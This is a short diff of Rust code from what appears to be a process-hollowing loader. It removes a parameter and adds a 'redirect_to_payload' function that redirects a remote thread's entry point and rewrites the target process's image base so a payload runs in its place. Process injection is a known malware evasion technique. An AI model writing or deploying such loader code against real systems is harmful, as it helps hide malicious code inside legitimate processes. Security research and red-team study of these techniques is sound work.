@@ -373,7 +373,7 @@ fn redirect_ep(thread: HANDLE, loaded_pe: PByte, loaded_base: PVoid) -> bool {
     update_remove_ep(thread, ep_va)
 }
 
-fn set_new_image_base(process: HANDLE, thread: HANDLE, loaded_pe: PByte, loaded_base: PVoid) -> bool {
+fn set_new_image_base(process: HANDLE, thread: HANDLE, loaded_base: PVoid) -> bool {
     let Some(remote_peb_address) = get_remote_peb_address(thread) else {
         return false
     };
@@ -392,4 +392,9 @@ fn set_new_image_base(process: HANDLE, thread: HANDLE, loaded_pe: PByte, loaded_
             &mut written
         ) == TRUE
     }
+}
+
+fn redirect_to_payload(loaded_pe: PByte, loaded_base: PVoid, process: HANDLE, thread: HANDLE) -> bool {
+    redirect_ep(thread, loaded_pe, loaded_base)
+        && set_new_image_base(process, thread, loaded_base)
 }
